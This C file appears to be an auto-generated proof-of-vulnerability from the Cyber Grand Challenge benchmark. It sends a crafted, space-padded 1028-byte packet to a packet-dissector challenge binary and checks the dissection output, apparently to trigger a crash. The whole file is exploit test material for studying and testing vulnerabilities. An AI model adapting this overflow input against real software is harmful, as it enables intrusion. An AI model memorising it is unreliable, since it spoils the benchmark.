#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x90\xeb\x50\xc4"
         "\x46\x74\x5e\xff\xe3\xef\x41\xdd\x90\x7c\x61\xd7\xc4\x5b\x5f\xad"
         "\xd9\x01\x00\x00\x1b\xe7\x03\xbf\xd3\xde\x59\xd3\xe7\x32\xa4\x3e"
         "\xe4\x71\xed\x9d\x49\xd5\xdb\xe4\x14\xc0\x2b\x56\x54\xf6\xea\xfb"
         "\x49\x3b\x23\xc7\x04\x70\xb2\x8d\xa8\x5d\xba\x58\x9c\xd1\x04\x1d"
         "\x2a\x9b\x00\xd4\x84\x4d\xad\xe2\x31\x82\xad\x07\xcf\x4f\x40\xc8"
         "\x50\x05\x99\x82\x5d\x59\x0c\x67\x01\x34\x37\xd7\x63\x7a\x6f\xee"
         "\x1c\xba\xd0\x06\x3b\x37\x6b\xd0\x55\x1e\x08\xce\xec\x5c\xad\x1f"
         "\xb3\xbe\x85\x52\xae\xd2\x7e\x9c\xfe\x30\x2a\xa0\x6e\x3e\xf5\xf7"
         "\x17\x92\x6b\x47\x13\xbc\x77\xc5\x6b\x80\x62\xf4\xec\xbe\x4e\x46"
         "\xc2\x6a\x6f\x3e\x32\xfb\x15\xc5\xb9\xb8\x52\xf6\x3c\x44\xdc\xe8"
         "\x5b\xe0\x74\xb4\xed\x37\xd4\xd8\xf3\xff\x32\xd2\x4d\x3b\x80\x3f"
         "\x23\x3c\x01\x33\x91\xd7\x80\x42\x66\x20\x94\x08\x2d\x14\xa8\x6a"
         "\x12\xeb\x6e\x2b\xef\x74\x45\x6c\x20\x40\xc2\x97\x91\x9d\xaf\x51"
         "\x48\xdf\x2e\xf6\x50\x32\x8c\x04\x25\xfa\x6c\x4e\xfe\xae\x5a\x07"
         "\xd2\x28\xae\xe6\xa6\x77\x4b\xad\x42\x71\x9e\xf7\x7c\xf9\xb2\xc7"
         "\xa3\xdb\x21\x66\x50\xf2\x35\xb9\x7f\xf5\x5b\x8b\x46\xbf\x03\x1f"
         "\xd2\x52\x72\xed\x09\x16\x43\xc0\x6c\x1b\x00\x7c\x9d\xf8\x05\x12"
         "\xb0\x2e\x02\x2f\x53\xcb\x5b\x08\xaa\x33\xc7\x01\xc1\x3d\x97\x5a"
         "\x71\x73\x36\xf9\x22\xde\xff\xe1\x67\xf0\x4c\x6c\xce\x2f\xc7\x4e"
         "\x97\x79\x70\x03\x67\xca\xbc\x1d\xff\xa0\xf6\x9f\x16\xee\x3f\xe2"
         "\x38\xf0\x47\x62\x01\xf8\x33\xe3\xa2\xa9\x64\x65\x7c\xa1\xa7\x3c"
         "\xbd\x12\xa7\x0c\xfd\x9e\x80\x4f\x20\x24\x07\xa3\x3b\x53\x11\xc0"
         "\x39\x78\x70\x11\x6a\xd2\x14\x8d\x22\xe5\x16\x07\x72\x00\xb0\xef"
         "\x3c\xe5\x7d\x71\x1e\x96\x21\x10\x59\x54\x32\xc5\x25\xb3\x6a\xf1"
         "\x88\xea\x05\x85\x46\xf7\xe0\xdd\xf3\xb6\x1d\xfa\xef\xa3\xa3\xf7"
         "\x86\xc6\xa5\xe2\xe8\x32\x32\x1d\xd0\x23\x95\xdd\xb4\xde\xd5\xb4"
         "\xa9\xff\x83\x3d\xf8\x14\x1d\x11\x5b\xe4\xf1\x88\x7d\x1e\x85\x4c"
         "\xd2\x9a\x31\x91\x60\x15\x97\x94\xa0\x3a\x76\x9e\x46\x98\x46\x07"
         "\xfd\x50\x98\x19\x36\x86\x7c\x95\x8a\xfe\x22\x5a\x72\x65\xcb\xa6"
         "\x7d\x20\x89\x97\x21\xe1\x77\x24\x0a\xa6\x4c\x18\x76\x4d\x16\x43"
         "\x2b\x94\x43\xdb\x6d\x52\x86\x59\xb5\xb6\xd1\x3e\x4f\x15\xc2\xda"
         "\xa6\x41\x29\x0e\x32\x87\x9f\x82\x52\x27\xfb\x1f\x40\x65\xe1\xdb"
         "\xfb\x15\x7b\x51\x18\x81\x68\x1d\x55\x3a\x2f\x38\x7a\x50\x04\x0c"
         "\x6e\x79\xaa\xaf\x66\xb0\x3d\x82\xa9\x27\x45\x5e\x46\xf0\xc1\xb9"
         "\x9c\x33\x1d\x0c\xee\xb0\x5b\x0b\xb8\x72\x16\x42\x64\x01\xd9\x25"
         "\xba\xb6\xac\x00\x03\xd8\x90\x4b\xef\x37\x1e\xbe\xdd\xdb\x43\xd3"
         "\x7d\xa2\x7c\xf6\x1e\xbd\x75\x52\x9f\x6e\xee\x27\xa1\x2c\x70\x08"
         "\x0f\x97\xa1\xdb\xe3\xf9\x34\xac\x11\xc7\x74\x78\x6a\xca\xfd\x18"
         "\x90\x77\x02\x55\x85\x2c\x01\x52\xf5\x07\xb8\x38\xf6\x9c\xa9\x1f"
         "\xdb\x8f\xa9\xaa\x4f\x3a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===grammaticismmignonette
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x67\x72\x61\x6d\x6d\x61\x74\x69\x63\x69\x73"
         "\x6d\x6d\x69\x67\x6e\x6f\x6e\x65\x74\x74\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
